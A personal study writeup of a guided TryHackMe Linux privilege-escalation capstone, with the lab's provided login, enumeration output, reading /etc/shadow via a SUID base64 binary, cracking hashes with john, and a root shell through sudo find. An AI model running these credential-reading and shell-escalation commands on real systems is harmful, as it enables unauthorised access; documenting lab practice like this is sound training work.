**Main Topic:** Linux_Privilege_Escalation
**Sub Topic:** Linux_Privesc_Writeup_Challange
**Date:** 09-06-2026
**Resources:**
**Related Notes:**
Tags: #status/done
[Offensive_Security](/Offensive_Security/0_Offensive_Security_MOC.md) > [Linux_Privilege_Escalation](/Offensive_Security/Linux_Privilege_Escalation/0_Linux_Privilege_Escalation_MOC.md) > Linux_Privesc_Writeup_Challange

---

# TryHackMe — Linux_Privesc_Writeup_Challange

**Platform:** [TryHackMe](https://tryhackme.com)
**Room:** [Linux Privilege Escalation](https://tryhackme.com/room/linprivesc)
**Task:** [TASK 12 - Capstone Challange](https://tryhackme.com/room/linprivesc?taskNo=12&sharerId=6702abe0f77a70c90629f7db)
**Difficulty:**


> This is a guided TryHackMe room, not an independent CTF challenge.
> The target credentials were provided by the platform.
> The purpose of this writeup is to document the techniques practiced and
> reinforce learning, not to demonstrate blind exploitation.

> **Username: leonard**
> **Password: Penny123**
> **Target IP:** 10.114.178.200


---

## Connection

```bash
ssh leonard@10.114.178.200
# Password: Penny123
```

---

## Recon & Enumeration

### # SUID binaries (non-snap)


> [!NOTE] Why we use "grep -v snap"
> Because snap packages have a lot of SUID binaries by design — they're part of the snap runtime and not exploitable. Without filtering them the output is cluttered with dozens of irrelevant entries.


```bash
find / -perm -u=s -type f 2>/dev/null | grep -v snap
```

```
/usr/bin/base64  
/usr/bin/ksu  
/usr/bin/fusermount  
/usr/bin/passwd  
/usr/bin/gpasswd  
/usr/bin/chage  
/usr/bin/newgrp  
/usr/bin/staprun  
/usr/bin/chfn  
/usr/bin/su  
/usr/bin/chsh  
/usr/bin/Xorg  
/usr/bin/mount  
/usr/bin/umount  
/usr/bin/crontab  
/usr/bin/pkexec  
/usr/bin/at  
/usr/bin/sudo  
/usr/sbin/pam_timestamp_check  
/usr/sbin/unix_chkpwd  
/usr/sbin/usernetctl  
/usr/sbin/userhelper  
/usr/sbin/mount.nfs  
/usr/lib/polkit-1/polkit-agent-helper-1  
/usr/libexec/kde4/kpac_dhcp_helper  
/usr/libexec/dbus-1/dbus-daemon-launch-helper  
/usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper  
/usr/libexec/qemu-bridge-helper  
/usr/libexec/sssd/krb5_child  
/usr/libexec/sssd/ldap_child  
/usr/libexec/sssd/selinux_child  
/usr/libexec/sssd/proxy_child  
/usr/libexec/abrt-action-install-debuginfo-to-abrt-cache  
/usr/libexec/flatpak-bwrap
```

> Compared the results against [GTFOBins](https://gtfobins.github.io) using the SUID filter.  
> `/usr/bin/base64` stood out — GTFOBins shows it can be used for privileged file reads.

---
### Cron jobs
```bash
cat /etc/crontab
```
> There are no cron jobs.

---
### Capabilities
```bash
getcap -r / 2>/dev/null
```

```
/usr/bin/newgidmap = cap_setgid+ep  
/usr/bin/newuidmap = cap_setuid+ep  
/usr/bin/ping = cap_net_admin,cap_net_raw+p  
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep  
/usr/sbin/arping = cap_net_raw+p  
/usr/sbin/clockdiff = cap_net_raw+p  
/usr/sbin/mtr = cap_net_raw+ep  
/usr/sbin/suexec = cap_setgid,cap_setuid+ep
```
> All capabilities belong to system binaries or require specific conditions — none are directly exploitable from this user context.

---
### Writables

> [!NOTE] 
> `/proc` and `/sys` are virtual filesystems — they're not real directories on disk. They represent kernel internals, running processes, and hardware interfaces. They show up as writable because your process owns them, but they're not actual attack surfaces for privilege escalation.

```bash
find / -writable -type d 2>/dev/null | grep -v proc | grep -v sys
```

```
/dev/mqueue  
/dev/shm  
/run/user/1000  
/var/tmp  
/tmp  
/tmp/.Test-unix  
/tmp/.font-unix  
/tmp/.ICE-unix  
/tmp/.X11-unix  
/tmp/.XIM-unix  
/tmp/leonard  
/home/leonard  
/home/leonard/.mozilla  
/home/leonard/.mozilla/extensions  
/home/leonard/.mozilla/plugins  
/home/leonard/.cache  
/home/leonard/.cache/abrt  
/home/leonard/.config  
/home/leonard/.config/abrt  
/home/leonard/.local  
/home/leonard/.local/share  
/home/leonard/perl5
```

---

### NFS 
```bash
cat /etc/exports 2>/dev/null
```
> There is nothing.

---
### Sudo
```bash
sudo -l
```
> No sudo for leonard either.

---
## Exploit
### Let's use `base64` SUID bit
#### read /etc/shadow
```bash
base64 /etc/shadow | base64 --decode
```

#### read /etc/passwd
```bash
base64 /etc/passwd | base64 --decode
```

#### Save both to Kali, then unshadow + john
```bash
unshadow passwd.txt shadow.txt > passwords.txt
john passwords.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

> **Here, we retrieve the password for the user named “missy”.** 

---

## Part 2 (user = missy)

```bash
su missy
# enter the cracked password
```

### Find flags
```bash
find / -name flag*.txt 2>/dev/null  
/home/missy/Documents/flag1.txt
```

```bash
cat /home/missy/Documents/flag1.txt
<FLAG1>
```

---

### Check the `missy`'s priveleges
```bash
sudo -l
Matching Defaults entries for missy on ip-10-114-178-200:  
   !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",  
   env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",  
   secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin  
  
User missy may run the following commands on ip-10-114-178-200:  
   (ALL) NOPASSWD: /usr/bin/find
```
> Compared the results against [GTFOBins](https://gtfobins.github.io) using the 'sudo' filter.  
> `/usr/bin/find` stood out — GTFOBins shows it can be used for privileged shell, file reads and file writes.

### Exploitation (get the root shell using `find`)
```bash
sudo find . -exec /bin/sh \; -quit
```

```bash
whoami
# root
```
> Now, we are root.

### Find the flag
```bash
find / -name flag*.txt  
/home/missy/Documents/flag1.txt  
/home/rootflag/flag2.txt
```
> We found the first flag; now it's time for the second one.

```bash
cat /home/rootflag/flag2.txt
<FLAG2>
```

---

## Key Takeaways

### Suggested Key Takeaways

- Privilege escalation is often chained — gaining access as one user may unlock vectors unavailable to the initial foothold user
- `base64` SUID is a file read primitive, not a shell — its value lies in reading `/etc/shadow` to crack hashes and pivot to a more privileged user
- Always run `sudo -l` on every new user you pivot to — privilege levels vary significantly between users
- Enumeration tools like LinPEAS save time but manual targeted checks (`find`, `getcap`, `cat /etc/crontab`) are faster when you know what to look for.
---

## Related Notes
- [Linux Privilege Escalation](/Offensive_Security/Linux_Privilege_Escalation/0_Linux_Privilege_Escalation_MOC.md)


---
[Offensive_Security](/Offensive_Security/0_Offensive_Security_MOC.md) > [Linux_Privilege_Escalation](/Offensive_Security/Linux_Privilege_Escalation/0_Linux_Privilege_Escalation_MOC.md) > Linux_Privesc_Writeup_Challange